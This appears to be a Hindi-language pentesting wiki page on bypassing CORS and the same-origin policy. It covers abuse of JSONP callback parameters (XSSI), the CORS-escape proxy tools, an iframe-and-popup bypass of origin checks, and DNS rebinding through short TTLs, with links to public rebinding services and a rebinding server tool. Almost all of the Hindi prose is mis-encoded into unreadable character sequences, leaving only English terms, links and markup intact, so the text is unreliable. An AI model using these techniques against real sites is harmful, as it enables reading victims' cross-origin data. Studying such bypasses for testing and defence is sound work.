XSSI, рдЬрд┐рд╕реЗ рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрдирдХреНрд▓реВрдЬрди рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ рдкреНрд░рдХрд╛рд░ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рд╣реИ рдЬреЛ рдЗрд╕ рддрдереНрдп рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛рддреА рд╣реИ рдХрд┐ рд╕реЗрдо рдСрд░рд┐рдЬрд┐рди рдиреАрддрд┐ (SOP) рдХреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреЗ рд╕рдордп рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд╡рд┐рднрд┐рдиреНрди рдбреЛрдореЗрди рд╕реЗ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рджреЗрддрд╛ рд╣реИ рдХрд┐ рд╡рд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХрд┐рд╕реА рднреА рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдВрдЪреЗ рдФрд░ рдкрдврд╝ рд╕рдХреЗред

рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рдЬрдм рдпрд╣ рдбрд╛рдпрдирд╛рдорд┐рдХ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдпрд╛ JSONP (рдкреИрдбрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдЬреЗрд╕рди) рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЖрддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖рдХрд░ рдЬрдм рдПрдореНрдмрд┐рдПрдВрдЯ-рдЕрдереЙрд░рд┐рдЯреА рд╕реВрдЪрдирд╛ рдЬреИрд╕реЗ рдХреБрдХреАрдЬрд╝ рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рд╡рд┐рднрд┐рдиреНрди рд╣реЛрд╕реНрдЯ рд╕реЗ рд╕рдВрд╕рд╛рдзрди рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╕рдордп, рдХреБрдХреАрдЬрд╝ рд╢рд╛рдорд┐рд▓ рдХреА рдЬрд╛рддреА рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдЙрдиреНрд╣реЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдВрдЪрдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрддрд╛ рдорд┐рд▓рддреА рд╣реИред

рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХреЛ рдмреЗрд╣рддрд░ рд╕рдордЭрдиреЗ рдФрд░ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдЕрдкрдиреЗ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ XSSI рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖реЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдФрд░ рд╕рдорд╛рдзрд╛рди рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рдмрд░реНрдкрд╕реНрдпреВрдЯ рдкреНрд▓рдЧрдЗрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp) рдкрд░ рдЙрдкрд▓рдмреНрдз рдЗрд╕ рдкреНрд▓рдЧрдЗрди рдХреА рдорджрдж рд╕реЗ рдЖрдк рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХреЛ рдкрд╣рдЪрд╛рдирдиреЗ рдФрд░ рд╕рдВрдмреЛрдзрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

[**рдпрд╣рд╛рдБ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ XSSI рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдХреИрд╕реЗ рд╢рд╛рддрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдкрдврд╝реЗрдВред**](xssi-cross-site-script-inclusion.md)

рдЕрдиреБрд░реЛрдз рдореЗрдВ рдПрдХ **`рдХреЙрд▓рдмреИрдХ`** **рдкреИрд░рд╛рдореАрдЯрд░** рдЬреЛрдбрд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВред рд╢рд╛рдпрдж рдкреЗрдЬ рдХреЛ JSONP рдХреЗ рд░реВрдк рдореЗрдВ рдбреЗрдЯрд╛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдкреЗрдЬ рдбреЗрдЯрд╛ рдХреЛ `Content-Type: application/javascript` рдХреЗ рд╕рд╛рде рднреЗрдЬреЗрдЧрд╛ рдЬрд┐рд╕рд╕реЗ CORS рдиреАрддрд┐ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

![](<../.gitbook/assets/image (229).png>)

### рдЖрд╕рд╛рди (рдЕрдлрд╝рд╕реЛрд╕рдирд╛рдХ?) рдмрд╛рдпрдкрд╛рд╕

`Access-Control-Allow-Origin` рдкреНрд░рддрд┐рдмрдВрдз рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реЗ рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ рдФрд░ рдкреНрд░рддрд┐рд╕рд╛рдж рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдПред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдЕрдВрддрд┐рдо рдкреАрдбрд╝рд┐рдд рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд╣реАрдВ рднреЗрдЬреЗ рдЬрд╛рдПрдВрдЧреЗ рдХреНрдпреЛрдВрдХрд┐ рдЕрдиреБрд░реЛрдз рдПрдХ рд╡рд┐рднрд┐рдиреНрди рдбреЛрдореЗрди рдкрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): рдпрд╣ рдЙрдкрдХрд░рдг рдПрдХ рдкреНрд░реЙрдХреНрд╕реА рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдЙрд╕рдХреЗ рд╣реЗрдбрд░реНрд╕ рдХреЗ рд╕рд╛рде рдЖрдЧреЗ рднреЗрдЬрддрд╛ рд╣реИ, рдЬрдмрдХрд┐ рдЕрднрд┐рдХреНрд░рд┐рдпрд╛ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрддреНрдкрд╛рджрд┐рдд рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП рдореВрд▓ рд╢реАрд░реНрд╖рдХ рдХреЛ рдзреЛрдЦрд╛ рджреЗрддрд╛ рд╣реИред рдпрд╣ CORS рдиреАрддрд┐ рдХреЛ рдкрд╛рд░ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред XMLHttpRequest рдХреЗ рд╕рд╛рде рдПрдХ рдЙрджрд╛рд╣рд░рдг рдЙрдкрдпреЛрдЧ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:

2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): рдпрд╣ рдЙрдкрдХрд░рдг рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░реЙрдХреНрд╕реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЖрдкрдХреЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдЬреИрд╕рд╛ рд╣реИ, рдЙрд╕реЗ рдЖрдЧреЗ рдирд╣реАрдВ рднреЗрдЬрддрд╛ рд╣реИ, рд╕рд░реНрд╡рд░ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рдЕрдкрдирд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИред

### рдЖрдИрдлреНрд░реЗрдо + рдкреЙрдкрдЕрдк рдмрд╛рдпрдкрд╛рд╕

рдЖрдк **рдПрдХ рдЖрдИрдлреНрд░реЗрдо рдмрдирд╛рдХрд░ CORS рдЬрд╛рдВрдЪреЛрдВ** рдЬреИрд╕реЗ рдХрд┐ `e.origin === window.origin` рдХреЛ **рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ **рдЗрд╕рд╕реЗ рдПрдХ рдирдпрд╛ рд╡рд┐рдВрдбреЛ рдЦреЛрд▓ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдореЗрдВ рд╣реИ:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### TTL рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ DNS рд░реАрдмрд╛рдЗрдВрдбрд┐рдВрдЧ

TTL рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ DNS рд░реАрдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдПрдХ рддрдХрдиреАрдХ рд╣реИ рдЬреЛ DNS рд░рд┐рдХреЙрд░реНрдб рдХреЛ рдорд╛рдирд┐рдпрддрд╛ рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИред рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ:

1. рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рд╡реЗрдм рдкреЗрдЬ рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ рдкреАрдбрд╝рд┐рдд рд╕реЗ рдЙрд╕реЗ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рддрд╛ рд╣реИред
2. рд╣рдорд▓рд╛рд╡рд░ рдлрд┐рд░ рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рдбреЛрдореЗрди рдХрд╛ DNS (рдЖрдИрдкреА) рдкреАрдбрд╝рд┐рдд рдХреЗ рд╡реЗрдм рдкреЗрдЬ рдкрд░ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓рддрд╛ рд╣реИред
3. рдкреАрдбрд╝рд┐рдд рдХрд╛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ DNS рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреИрд╢ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдПрдХ TTL (рдЯрд╛рдЗрдо рдЯреВ рд▓рд┐рд╡) рдорд╛рди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдмрддрд╛рддрд╛ рд╣реИ рдХрд┐ DNS рд░рд┐рдХреЙрд░реНрдб рдХреЛ рдХрд┐рддрдиреА рджреЗрд░ рддрдХ рдорд╛рдиреНрдп рдорд╛рдирд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
4. рдЬрдм TTL рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рдкреАрдбрд╝рд┐рдд рдХрд╛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХ рдирдпрд╛ DNS рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдкреАрдбрд╝рд┐рдд рдХреЗ рдкреГрд╖реНрда рдкрд░ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред
5. рдкреАрдбрд╝рд┐рдд рдХреЗ рдЖрдИрдкреА рдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд░рд╣рдХрд░, рд╣рдорд▓рд╛рд╡рд░ рдкреАрдбрд╝рд┐рдд рд╕рд░реНрд╡рд░ рдХреЛ рдХреБрдХреАрдЬрд╝ рднреЗрдЬреЗ рдмрд┐рдирд╛ рдкреАрдбрд╝рд┐рдд рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдПрдХрддреНрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдХреЗ рдкрд╛рд╕ рдХреИрд╢рд┐рдВрдЧ рдореЗрдХреЗрдирд┐рдЬрд╝рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рддреБрд░рдВрдд рджреБрд░реБрдкрдпреЛрдЧ рд░реЛрдХ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╣рд╛рдВ рднреА рдирд┐рдореНрди TTL рдорд╛рдиреЛрдВ рдХреЗ рд╕рд╛рдеред

DNS рд░реАрдмрд╛рдЗрдВрдбрд┐рдВрдЧ рд╡рд┐рдХрд▓реНрдкрд┐рдд рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬрдм рдкреАрдбрд╝рд┐рдд рджреНрд╡рд╛рд░рд╛ рдХрд┐рдП рдЧрдП рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЖрдИрдкреА рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╛ рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рдмреЙрдЯ рдПрдХ рд▓рдВрдмреЗ рд╕рдордп рддрдХ рдПрдХ рд╣реА рдкреГрд╖реНрда рдкрд░ рд░рд╣рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХреИрд╢ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдХрд╛ рд╕рдордп рд╣реЛрддрд╛ рд╣реИред

рдпрджрд┐ рдЖрдк DNS рд░реАрдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рддреНрд╡рд░рд┐рдд рддрд░реАрдХрд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html) рдЬреИрд╕реА рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЕрдкрдиреА рдЦреБрдж рдХреА DNS рд░реАрдмрд╛рдЗрдВрдбрд┐рдВрдЧ рд╕рд░реНрд╡рд░ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)) рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдореЗрдВ рдЕрдкрдиреЗ рд╕реНрдерд╛рдиреАрдп рдкреЛрд░реНрдЯ 53/udp рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рдирд╛, рдЗрд╕рдХреЗ рд▓рд┐рдП рдПрдХ рдП рд░рд┐рдХреЙрд░реНрдб рдмрдирд╛рдирд╛ рдЬреЛ рдЗрд╕реЗ рдкреЙрдЗрдВрдЯ рдХрд░рддрд╛ рд╣реИ (рдЬреИрд╕реЗ, ns.example.com), рдФрд░ рдкрд╣рд▓реЗ рдмрдирд╛рдП рдЧрдП рдП рдЙрдкрдбреЛрдореЗрди рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдПрдирдПрд╕ рд░рд┐рдХреЙрд░реНрдб рдмрдирд╛рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред ns.example.com рдЙрдкрдбреЛрдореЗрди рдХрд╛ рдХреЛрдИ рднреА рдЙрдкрдбреЛрдореЗрди рдЖрдкрдХреЗ рд╣реЛрд╕реНрдЯ рджреНрд╡рд╛рд░рд╛ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЖрдк рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [http://rebind.it/singularity.html](http://rebind.it/singularity.html) рдкрд░ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЪрд▓ рд░рд╣реЗ рд╕рд░реНрд╡рд░ рдХрд╛ рдЕрдзреНрдпрдпрди рдФрд░ рдкреНрд░рдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
